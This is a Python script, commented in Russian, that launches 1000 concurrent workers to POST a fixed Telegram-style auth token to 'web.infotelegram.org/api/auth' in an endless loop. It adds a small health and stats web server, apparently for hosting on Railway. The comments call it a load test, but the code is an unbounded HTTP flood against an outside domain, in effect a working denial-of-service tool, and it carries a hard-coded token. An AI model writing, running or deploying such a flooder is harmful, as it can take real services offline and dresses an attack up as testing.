import asyncio
import aiohttp
from aiohttp import web
import json
import sys
import time
from collections import defaultdict

# --- Конфигурация ---
URL = "https://web.infotelegram.org/api/auth"
PAYLOAD_DATA = "tgWebAuthToken=K3lAmoEkgzGN9GxufePihbJHqpc2jY9U1leGcNQiJwOZELqyizWS-AR5LBo8du5A32f_UwtvZIyGxFwUfugFC67u3mVor3F6d1XewaEGN8_oj0HxfytRh7qrIw7j23eJz9bVVtDvNYQJ5DRlEWRdpSxW8uZuSnlECIMQr_EFwPc&tgWebAuthUserId=1337&tgWebAuthDcId=1"
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
CONCURRENT_REQUESTS = 1000      # Количество одновременных запросов
REQUEST_TIMEOUT = 1             # Таймаут на запрос в секундах
LOG_DETAIL_EVERY = 100          # Выводить детали ответа каждые N успешных запросов
LOG_ERROR_BODY_LIMIT = 300      # Максимальная длина тела ошибки для вывода в консоль

# --- Глобальная статистика ---
stats = {
    "start_time": time.time(),
    "total_sent": 0,
    "total_failed": 0,
    "status_codes": defaultdict(int),
    "exceptions": defaultdict(int),
    "last_response": None,       # последний полученный ответ (для отладки)
}

async def send_request(session, payload_json):
    """Отправляет один POST-запрос и обновляет статистику."""
    global stats
    try:
        async with session.post(URL, json=payload_json, headers=HEADERS, timeout=REQUEST_TIMEOUT) as resp:
            stats["total_sent"] += 1
            status = resp.status
            stats["status_codes"][status] += 1

            # Читаем тело ответа только если нужно логировать
            response_text = None
            if status != 200 or stats["total_sent"] % LOG_DETAIL_EVERY == 0:
                try:
                    response_text = await resp.text()
                except Exception:
                    response_text = "<binary/undecodable>"

            # Логирование не-200 ответов
            if status != 200:
                truncated = response_text[:LOG_ERROR_BODY_LIMIT] if response_text else "<empty>"
                print(f"[!] Ошибка HTTP {status} (запрос #{stats['total_sent']}): {truncated}")
                # Сохраняем последний ошибочный ответ для быстрого просмотра
                stats["last_response"] = {
                    "status": status,
                    "headers": dict(resp.headers),
                    "body": truncated
                }
            elif stats["total_sent"] % LOG_DETAIL_EVERY == 0:
                # Периодический вывод успешных ответов
                truncated = response_text[:200] if response_text else "<empty>"
                print(f"[OK] Запрос #{stats['total_sent']} статус {status}, тело: {truncated}")
                stats["last_response"] = {
                    "status": status,
                    "headers": dict(resp.headers),
                    "body": truncated
                }
            else:
                # Краткий прогресс каждые 100 запросов
                if stats["total_sent"] % 100 == 0:
                    print(f"Прогресс: отправлено {stats['total_sent']}, ошибок {stats['total_failed']}")

    except Exception as e:
        stats["total_failed"] += 1
        exc_name = type(e).__name__
        stats["exceptions"][exc_name] += 1
        if stats["total_failed"] % 10 == 0:
            print(f"[X] Ошибка соединения (всего {stats['total_failed']}): {exc_name}: {e}")

async def worker(worker_id, session, payload_json, queue):
    """Бесконечно берёт задачи из очереди и отправляет запросы."""
    while True:
        await queue.get()
        await send_request(session, payload_json)
        queue.task_done()

async def burst_loop():
    """Бесконечно наполняет очередь задачами."""
    payload_json = {"data": PAYLOAD_DATA}
    queue = asyncio.Queue(maxsize=CONCURRENT_REQUESTS * 2)

    async with aiohttp.ClientSession() as session:
        workers = []
        for i in range(CONCURRENT_REQUESTS):
            w = asyncio.create_task(worker(i, session, payload_json, queue))
            workers.append(w)

        # Бесконечно добавляем задачи
        while True:
            await queue.put(1)
            await asyncio.sleep(0)  # отдаём управление циклу событий

# --- Веб-сервер для мониторинга (нужен Railway и для отладки) ---
async def health_check(request):
    """Простой health check."""
    uptime = int(time.time() - stats["start_time"])
    return web.Response(text=f"OK. Uptime: {uptime}s, sent: {stats['total_sent']}, failed: {stats['total_failed']}")

async def stats_json(request):
    """Возвращает полную статистику в JSON."""
    uptime = int(time.time() - stats["start_time"])
    response_data = {
        "uptime_seconds": uptime,
        "total_sent": stats["total_sent"],
        "total_failed": stats["total_failed"],
        "status_codes": dict(stats["status_codes"]),
        "exceptions": dict(stats["exceptions"]),
        "last_response": stats["last_response"],
        "rps": stats["total_sent"] / uptime if uptime > 0 else 0
    }
    return web.json_response(response_data)

async def run_web_server():
    app = web.Application()
    app.router.add_get("/", health_check)
    app.router.add_get("/stats", stats_json)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", 8080)
    await site.start()
    print("🌐 Health-сервер запущен на порту 8080")
    await asyncio.Event().wait()

async def main():
    print(f"🚀 Запуск нагрузочного теста: {CONCURRENT_REQUESTS} одновременных соединений")
    print(f"🎯 Цель: {URL}")
    await asyncio.gather(
        run_web_server(),
        burst_loop()
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        uptime = int(time.time() - stats["start_time"])
        print("\n--- Завершение работы ---")
        print(f"Время работы: {uptime} сек")
        print(f"Всего отправлено: {stats['total_sent']}")
        print(f"Ошибок соединения: {stats['total_failed']}")
        print("Статусы HTTP:")
        for code, count in sorted(stats["status_codes"].items()):
            print(f"  {code}: {count}")
        print("Исключения:")
        for exc, count in stats["exceptions"].items():
            print(f"  {exc}: {count}")
        if stats["last_response"]:
            print(f"Последний ответ: {stats['last_response']['status']} - {stats['last_response']['body'][:100]}")
        sys.exit(0)
